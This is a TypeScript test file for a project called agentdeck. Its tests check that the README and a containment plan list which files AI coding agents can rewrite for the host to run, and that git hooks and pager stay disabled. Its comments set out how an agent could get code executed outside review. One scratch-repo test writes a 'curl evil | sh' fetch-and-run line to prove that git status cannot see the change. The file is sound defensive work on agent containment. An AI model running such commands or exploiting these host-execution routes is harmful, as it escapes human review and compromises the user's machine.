// agentdeck runs on the Mac now (plan 005 is superseded), so there is no boundary left to test -
// only the consequence, which is the same one and worse: an agent working in this repository can
// write the files the host then executes. The package.json scripts, eslint.config.mjs, and the
// node_modules and .pnpm-store trees git cannot see are all in reach, and review is the only
// control. These tests fail if that stops being written down where the claim is made.
//
// Plan 005's superseded header says these tests still apply, and this is what that means: the
// assertions about the container are gone, the assertions about what the container never covered
// are unchanged.

import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { readFile } from "node:fs/promises";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { describe, test } from "node:test";
import { fileURLToPath } from "node:url";

const repoRoot = new URL("..", import.meta.url);
const repoRootPath = fileURLToPath(repoRoot);

const readDoc = async (name: string): Promise<string> =>
  await readFile(new URL(name, repoRoot), "utf8");

// pnpm-lock.yaml belongs here for the same reason as package.json and is easier to miss:
// pnpm 9 does not gate dependency lifecycle scripts, so a rewritten `resolution` entry runs
// on the host at the next install. The container-local node_modules volume protects the
// installed tree, not the input that produces it.
//
// The last three are the ones a build-file-shaped review list misses. `src/**/*.test.ts` is what
// `pnpm test` hands to `node --test`, which runs it as code — this very file already calls
// execFileSync, so one more shell-out is unremarkable in a diff. `mise.toml` documents
// `mise install` and mise executes `[env] _.source` and `[tasks]` on the host. `.claude/` needs no
// build and no host `pnpm` at all: a Claude Code process on the Mac loads SKILL.md, CLAUDE.md and
// settings.json from it, so starting a session in this repo is the whole trigger — and the skill
// there is what prescribes this review.
//
// The globs are deliberate. Every host tool here discovers its own config, so naming the one
// filename we happen to have leaves the rest unreviewed: prettier imports its `plugins` entries
// as JavaScript from any `.prettierrc*`, and mise reads `.mise.toml`, `mise.local.toml` and
// `mise-tasks/` as readily as `mise.toml`. `.github/workflows/` is the surface that picks its own
// privileges — `permissions:` lives inside the file being protected. `.git/config` and
// `.git/hooks/` are executed by git itself, which makes the prescribed `git diff` its own
// trigger, and neither is tracked, so the review cannot see them at all.
//
// `scripts/` is the one a lockfile-shaped review misses entirely. `package.json` declares
// `"postinstall": "node scripts/fix-node-pty-permissions.mjs"`, and pnpm always runs the ROOT
// project's own lifecycle scripts - the pnpm 9 gating caveat above covers dependencies only. So
// `pnpm install --frozen-lockfile` executes a file in this tree no matter what the lockfile says,
// and `scripts/healthcheck.mjs` and `scripts/restart-survival.mjs` are run by hand besides.
const hostExecutedFiles = [
  "package.json",
  "scripts/",
  "pnpm-lock.yaml",
  "eslint.config.*",
  ".prettierrc*",
  ".mise*.toml",
  "mise-tasks/",
  "src/**/*.test.ts",
  ".claude/",
  ".github/workflows/",
  ".git/config",
  ".git/hooks/",
];

void describe("the host-execution consequence is documented where the claim is made", () => {
  void test("the README says the host executes agent-writable files from this repo", async () => {
    const readme = await readDoc("README.md");
    for (const file of hostExecutedFiles) {
      assert.ok(readme.includes(file), `README does not name ${file} as agent-writable`);
    }
    assert.match(readme, /agent-writable/);
  });

  void test("the README says the review is now the only control, not the second of two", async () => {
    // The container was the first of two. Its removal is the whole reason the review matters
    // more than it did, and a reader who does not meet that sentence will treat the checklist as
    // belt-and-braces.
    const readme = await readDoc("README.md");
    const toolchain = readme.slice(readme.indexOf("## Toolchain"));
    assert.ok(toolchain.length > 0, "README has no Toolchain section");
    assert.match(toolchain, /only control rather than the second of two/);
    assert.match(toolchain, /git status/);
    assert.match(toolchain, /git diff/);
  });

  void test("the host-run exception names everything the host would execute", async () => {
    // The exception paragraph is where a human decides to run something on the Mac, so the list
    // that matters is the one there, not the one anywhere in the file.
    const readme = await readDoc("README.md");
    const toolchain = readme.slice(readme.indexOf("## Toolchain"));
    for (const file of hostExecutedFiles) {
      assert.ok(
        toolchain.includes(file),
        `README's toolchain exception does not name ${file} as agent-writable`,
      );
    }
  });

  void test("plan 005 states it in what containment actually buys", async () => {
    const plan = await readDoc("plans/005-containment.md");
    const start = plan.indexOf("## What containment actually buys");
    assert.ok(start >= 0, "plan 005 has no `What containment actually buys` section");
    const section = plan.slice(start, plan.indexOf("\n## ", start + 1));
    for (const file of hostExecutedFiles) {
      assert.ok(section.includes(file), `plan 005 does not name ${file} as agent-writable`);
    }
  });
});

// `git status` cannot see either of these trees, so the ordinary review is blind to them - and
// the command that was supposed to cover that could not either. `git status --ignored` collapses
// an ignored directory to one line naming the DIRECTORY: a rewritten `node_modules/.bin/eslint`
// gives byte-identical output, and this file asserted the string was in the README, which turned
// an ineffective control into a green check. So the assertion is now the inverse - the README
// must NOT prescribe it - plus the replacement, which is the only shape that works here: replace
// the tree from the reviewed lockfile rather than inspect it.
void describe("the host-executed trees git cannot see are covered by a command that can", () => {
  for (const path of ["node_modules", ".pnpm-store"]) {
    void test(`${path} is gitignored, which is why the ordinary review misses it`, async () => {
      const ignored = await readDoc(".gitignore");
      assert.match(ignored, new RegExp(`^${path.replace(".", "\\.")}$`, "m"));
    });
  }

  void test("the README's checklist replaces the trees rather than inspecting them", async () => {
    const readme = await readDoc("README.md");
    assert.ok(
      readme.includes("rm -rf node_modules .pnpm-store && pnpm install --frozen-lockfile"),
      "README does not name a control that reaches inside the two gitignored executed trees",
    );
  });

  void test("and does not prescribe the check that reports the directory and not its contents", async () => {
    // Demonstrated, not asserted from memory: `git status --ignored` over an ignored directory
    // emits one line for the directory, so a file rewritten inside it changes nothing about the
    // output. This runs it against a scratch repository and shows exactly that.
    const dir = mkdtempSync(join(tmpdir(), "agentdeck-ignored-"));
    try {
      const git = (...args: string[]): string =>
        execFileSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
          cwd: dir,
          encoding: "utf8",
        });
      git("init", "-q");
      writeFileSync(join(dir, ".gitignore"), "node_modules\n");
      mkdirSync(join(dir, "node_modules", ".bin"), { recursive: true });
      writeFileSync(join(dir, "node_modules", ".bin", "eslint"), "#!/bin/sh\nexec eslint\n");
      const before = git("status", "--ignored", "--porcelain", "--", "node_modules");
      writeFileSync(join(dir, "node_modules", ".bin", "eslint"), "#!/bin/sh\ncurl evil | sh\n");
      const after = git("status", "--ignored", "--porcelain", "--", "node_modules");
      assert.equal(after, before, "git status --ignored turned out to see inside after all");
      assert.match(before, /node_modules\/\n?$/);

      const readme = await readDoc("README.md");
      assert.ok(
        !readme.includes("git status --ignored -- node_modules"),
        "the README prescribes a command that cannot see what it is prescribed for",
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  void test("both trees are named as agent-writable where the claim is made", async () => {
    const readme = await readDoc("README.md");
    const plan = await readDoc("plans/005-containment.md");
    for (const doc of [readme, plan]) {
      assert.match(doc, /node_modules/);
      assert.match(doc, /\.pnpm-store/);
    }
  });
});

// None of `.git` is tracked, so the `git status` / `git diff` review is as blind to
// `.git/config` and `.git/hooks/` as it is to node_modules - and `git diff` is itself what fires
// a `[core] pager` entry. The volume that used to mask `.git` from a container session is gone
// with the container, so what remains is the pair of commands that can see the surfaces and the
// hardening on every git command this pipeline runs.
const docs: readonly (readonly [string, string])[] = [
  ["README.md", "README.md"],
  ["plan 005", "plans/005-containment.md"],
];

void describe("git's own execution surfaces are covered where review cannot see them", () => {
  for (const [name, path] of docs) {
    void test(`${name} names the two commands that can see .git`, async () => {
      const doc = await readDoc(path);
      assert.ok(
        doc.includes("git config --local --list"),
        `${name} omits git config --local --list`,
      );
      assert.ok(doc.includes("ls -la .git/hooks"), `${name} omits ls -la .git/hooks`);
      assert.match(doc, /\.sample/);
    });
  }

  void test("the iterate skill runs host git with pager and hooks disabled", async () => {
    // The skill is what prescribes the review and then does the branch, merge and switch on the
    // host. Each of those is a hook trigger, and `git diff` is a pager trigger.
    const skill = await readDoc(".claude/skills/iterate/SKILL.md");
    const hardened = /git -c core\.pager=cat -c\s+core\.hooksPath=\/dev\/null/g;
    const uses = skill.match(hardened) ?? [];
    assert.ok(uses.length >= 4, `only ${uses.length} host git commands are hardened`);

    // A count is a floor, not coverage: every stage prompt ends with "Commit.", and those
    // commits are host git run by a subagent, which no per-command flag in this file reaches.
    // The shared prompt is the only layer that does, so assert the instruction is in it.
    assert.match(
      skill,
      /Every git command you run is HOST git/,
      "the shared agent prompt must tell every stage to harden its own git commands",
    );
    for (const bare of [
      /(?<!-c )\bgit switch -c /,
      /(?<!-c )\bgit merge --no-ff /,
      /(?<!-c )\bgit status --porcelain/,
    ]) {
      assert.doesNotMatch(skill, bare, `the skill still runs an unhardened ${String(bare)}`);
    }
  });
});

// The enumerated list is a floor: the host tools discover config we did not name, so a review
// scoped to the list is a review with a hole in it. Both documents have to say so.
void describe("the review list is stated as a floor rather than the whole job", () => {
  for (const [name, path] of docs) {
    void test(`${name} requires reviewing every modified file, not only the listed ones`, async () => {
      const doc = await readDoc(path);
      assert.match(doc, /floor/);
      assert.match(doc, /every added or modified\s+file in the diff/);
    });
  }

  void test("plan 005 says a workflow file declares its own permissions", async () => {
    const plan = await readDoc("plans/005-containment.md");
    const start = plan.indexOf("## What containment actually buys");
    const section = plan.slice(start, plan.indexOf("\n## ", start + 1));
    assert.match(section, /permissions:/);
    assert.match(section, /default workflow permission/);
  });
});

void describe("the user's bearer token is not at the root of a working tree", () => {
  void test(".gitignore does not put it at the repo root", async () => {
    // The repo root is a directory sessions are pointed at, and every session runs as the uid the
    // server runs as, so mode 0600 separates nothing. Placement is the only control left. Where
    // it should live now that there is no container is open, recorded in plan 005's superseded
    // header - this asserts only the one place it must not be.
    const ignored = await readDoc(".gitignore");
    assert.doesNotMatch(
      ignored,
      /^\.agentdeck-token$/m,
      ".agentdeck-token at the repo root is where an agent's own `ls -la` meets it",
    );
  });

  void test("neither .gitignore nor loadToken claims a container protects the placement", async () => {
    // The .gitignore comment is the only tracked file that tells a reader where the token goes,
    // and loadToken's docstring is the only one a reader of the code meets. Both used to say the
    // path was outside every bind mount, in a container that no longer exists - a protection a
    // reader would credit, and so never look at the placement again.
    //
    // The server.ts half is scoped to the token functions by NAME, not by a byte count. It was a
    // 3000-character slice, and the file had grown past it: the window ended above `loadToken`
    // entirely, so this stopped reading the docstring it is named for while still passing. The
    // boundary is `main`, above which live defaultTokenFile, tokenInsideAllowlist and loadToken;
    // below it is the AGENTDECK_MOUNTS comment, which explains where that variable's NAME came
    // from rather than crediting a mount with protecting anything.
    const server = await readDoc("src/server.ts");
    const ignored = await readDoc(".gitignore");
    for (const [path, text] of [
      [".gitignore", ignored],
      ["src/server.ts", server.slice(0, server.indexOf("export const main"))],
    ] as const) {
      assert.doesNotMatch(text, /bind mount/i, `${path} still credits a bind mount`);
      assert.doesNotMatch(text, /container-local volume/i, `${path} still credits a volume`);
    }
    assert.match(ignored, /AGENTDECK_TOKEN_FILE/);
    assert.match(ignored, /~\/\.agentdeck\/token/, ".gitignore must name where the token now is");
    assert.match(ignored, /inside a tree a session is\s*#?\s*pointed at/);
  });

  void test("the default token home is one a clean Mac already has, and no session is pointed at", async () => {
    // The old default was /var/lib/agentdeck/token, reasoned from a container-local volume: no
    // ordinary user on a Mac can create it, so `pnpm start` failed on the token before it reached
    // the port. Confirmed by hand at the time. The replacement has to be writable by this user
    // with nothing set, and outside every tree a session can be started in.
    const { defaultTokenFile, tokenInsideAllowlist } = await import("./server.ts");
    assert.equal(defaultTokenFile(), join(homedir(), ".agentdeck", "token"));
    assert.equal(tokenInsideAllowlist(defaultTokenFile(), [repoRootPath]), undefined);
  });

  void test("a token inside an allowlisted tree is caught, at the root and below it", async () => {
    // The rule plan 005 states in prose in three places, as a check. Containment, not membership:
    // a token one directory down inside an allowed repository is met by exactly the same
    // `grep -rn token .` as one at its root.
    const { tokenInsideAllowlist } = await import("./server.ts");
    const allowed = ["/workspace/web", "/workspace/agentdeck"];
    assert.equal(tokenInsideAllowlist("/workspace/web/token", allowed), "/workspace/web");
    assert.equal(tokenInsideAllowlist("/workspace/web/a/b/token", allowed), "/workspace/web");
    assert.equal(tokenInsideAllowlist("/workspace/web", allowed), "/workspace/web");
    // The neighbour whose name merely starts the same is not inside it, which is the mistake a
    // string prefix without the separator makes.
    assert.equal(tokenInsideAllowlist("/workspace/web-secrets/token", allowed), undefined);
    assert.equal(tokenInsideAllowlist("/var/lib/agentdeck/token", allowed), undefined);
  });

  void test("an unwritable token path is a sentence naming AGENTDECK_TOKEN_FILE", async () => {
    // An unhandled EACCES names no variable and the token then lands wherever happened to be
    // writable - including the one place it must not be.
    const { loadToken } = await import("./server.ts");
    const dir = mkdtempSync(join(tmpdir(), "agentdeck-token-"));
    try {
      chmodSync(dir, 0o500);
      assert.throws(
        () => loadToken(join(dir, "nested", "token")),
        (error: Error) => {
          assert.match(error.message, /AGENTDECK_TOKEN_FILE/);
          assert.match(error.message, /session is pointed at/);
          return true;
        },
      );
    } finally {
      chmodSync(dir, 0o700);
      rmSync(dir, { recursive: true, force: true });
    }
  });

  void test("plan 005 lists the token in the blast radius with the same-uid caveat", async () => {
    const plan = await readDoc("plans/005-containment.md");
    const start = plan.indexOf("## What containment actually buys");
    const section = plan.slice(start, plan.indexOf("\n## ", start + 1));
    assert.match(section, /AGENTDECK_TOKEN_FILE/);
    assert.match(section, /distinct uid/);
  });
});
